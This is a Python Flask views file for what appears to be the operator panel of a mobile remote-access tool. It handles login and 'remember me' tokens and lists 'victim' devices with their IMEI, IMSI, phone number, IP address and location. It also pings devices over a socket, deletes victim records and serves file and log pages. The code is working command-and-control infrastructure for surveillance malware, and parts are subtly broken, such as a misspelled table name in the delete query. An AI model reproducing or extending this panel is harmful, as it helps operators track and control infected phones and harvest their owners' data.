from flask import Blueprint, render_template, redirect, session, request, jsonify, url_for, make_response
from flask_socketio import emit
from sqlite3.dbapi2 import Error
import uuid
import datetime
import sqlite3
from passlib.hash import pbkdf2_sha256

views = Blueprint("views", __name__)

@views.route("/", methods=['GET'])
def index():
    if 'username' not in session:
        return redirect("/login", code=302)
    else:
        return render_template("index.html", username=session['username']), 200


@views.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        if 'username' in session:
            return redirect("/", code=302)
        elif 'auth' in request.cookies and 'username' in request.cookies:
            username = request.cookies.get('username')
            token = request.cookies.get('auth')
            try:
                con = sqlite3.connect("database.db")
                cur = con.cursor()
                cur.execute("SELECT token FROM user WHERE username= ?", (username,))
                record = cur.fetchall()
                con.close()
                if record.__len__() != 0 and record[0][0] == token:
                    session['username'] = username
                    return redirect("/", code=302)
                else:
                    return render_template("login.html"), 200
            except sqlite3.Error as error:
                pass
        else:
            return render_template("login.html"), 200
    elif request.method == 'POST' and request.form.get('username') is not None and request.form.get('password') is not None:
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            con = sqlite3.connect("database.db")
            cur = con.cursor()
            cur.execute("SELECT * FROM user WHERE username= ?", (username,))
            record = cur.fetchall()
            con.close()
            if record.__len__() != 0 and username == record[0][0]:
                if pbkdf2_sha256.verify(password, record[0][1]):
                    session['username'] = username
                    if request.form.get('remember') is not None:
                        token = str(uuid.uuid4())
                        try:
                            con = sqlite3.connect("database.db")
                            cur = con.cursor()
                            cur.execute("UPDATE user SET token= ? WHERE username=?", (token, username))
                            con.commit()
                            con.close()
                        except sqlite3.Error as error:
                            pass
                        expiry_date = datetime.datetime.now()
                        expiry_date = expiry_date + datetime.timedelta(days=30)
                        resp = make_response(redirect("/", code=302))
                        resp.set_cookie(key='auth', value=token, expires=expiry_date, domain='127.0.0.1')
                        resp.set_cookie(key='username', value=username, expires=expiry_date, domain='127.0.0.1')
                        return resp
                    return redirect("/", code=302)
                else:
                    return render_template("login.html", error="Login Failed. Incorrect username/password"), 401
            else:
                return render_template("login.html", error="Login Failed. Incorrect username/password"), 401
        except sqlite3.Error as error:
            return render_template("login.html", error="Oops something went wrong"), 401
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@views.route("/logout", methods=['GET'])
def logout():
    if request.method == 'GET':
        if 'username' in session:
            session.pop('username', None)
            if 'auth' in request.cookies and 'username' in request.cookies:
                resp = make_response(redirect("/login", code=302))
                resp.set_cookie(key='auth', expires=0)
                resp.set_cookie(key='username', expires=0)
                return resp
            return redirect("/login", code=302)
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@views.route("/dashboard", methods=['GET'])
def dashboard():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("dashboard.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@views.route("/log", methods=['POST'])
def log():
    if request.method == 'POST':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("log.html", log= [str(datetime.datetime.now().strftime('%d/%b/%Y %I:%M:%S %p')), request.form['highlight'], request.form['data']])}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", log= ["400", "Bad Request"]), 400

@views.route("/clients", methods=['POST'])
def clients():
    if request.method == 'POST':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("victim.html", data= [request.form['model'], request.form['device-id'], request.form['ip-address'], request.form['api'], request.form['imei'], request.form['socketid'], request.form['phone'], request.form['imsi'], request.form['location']])}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400

@views.route("/pingclient", methods=['POST'])
def ping_client():
    if request.method == 'POST':
        if 'username' in session:
            emit("ping", {"data" : ["syn", request.form['deviceid']],}, to=request.form['socketid'])
            return jsonify({"status" : "Device pinged. Waiting for response ..."}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400  

@views.route("/deleteclient", methods=['POST'])
def delete_client():
    if request.method == 'POST':
        if 'username' in session:
            try:
                con = sqlite3.connect("database.db")
                cur = con.cursor()
                cur.execute("SELECT deviceid FROM victim WHERE deviceid= ?", (request.form['deviceid'],))
                record = cur.fetchall()
                if record.__len__() != 0:
                    cur.execute("DELETE FROM vitcim WHERE deviceid= ?", (request.form['deviceid'],))
                    con.commit()
                con.close()
                return jsonify({"status" : "Record deleted"}), 200
            except sqlite3.Error as error:
                return "Deletion failed", 304
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400  

@views.route("/files", methods=['GET'])
def files():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("files.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@views.route("/settings", methods=['GET'])
def settings():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("settings.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@views.route("/reset", methods=['GET', 'POST'])
def reset_password():
    if request.method == 'GET' and 'username' in session:
        return render_template("reset-password.html", username=session['username']), 200
    elif request.method == 'POST' and request.form.get('username') is not None and request.form.get('password') is not None and 'username' in session:
        username = request.form.get('username')
        password = pbkdf2_sha256.hash(request.form.get('password'))
        token = str(uuid.uuid4())
        try:
            con = sqlite3.connect("database.db")
            cur = con.cursor()
            cur.execute("SELECT * FROM user WHERE username= ?", (session['username'],))
            record = cur.fetchall()
            if record.__len__() != 0:
                cur.execute("UPDATE user SET username= ?, passkey= ?, token= ? WHERE username=?", (username, password, token, session['username']))
                con.commit()
                con.close()
                session['username'] = username
                if 'auth' in request.cookies and 'username' in request.cookies:
                    resp = make_response(redirect("/", 302))
                    expiry_date = datetime.datetime.now()
                    expiry_date = expiry_date + datetime.timedelta(days=30)
                    resp = make_response(redirect("/", code=302))
                    resp.set_cookie(key='auth', value=token, expires=expiry_date, domain='127.0.0.1')
                    resp.set_cookie(key='username', value=username, expires=expiry_date, domain='127.0.0.1')
                    return resp
                return redirect("/", 302)
            else:
                con.close()
                return render_template("reset-password.html", error="Oops something went wrong"), 401
        except sqlite3.Error as error:
            con.close()
            return render_template("reset-password.html", error="Oops something went wrong"), 401
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400

@views.errorhandler(404)
def page_not_found(e):
    return render_template('error_page.html', code= ["404", "Not Found"]), 404
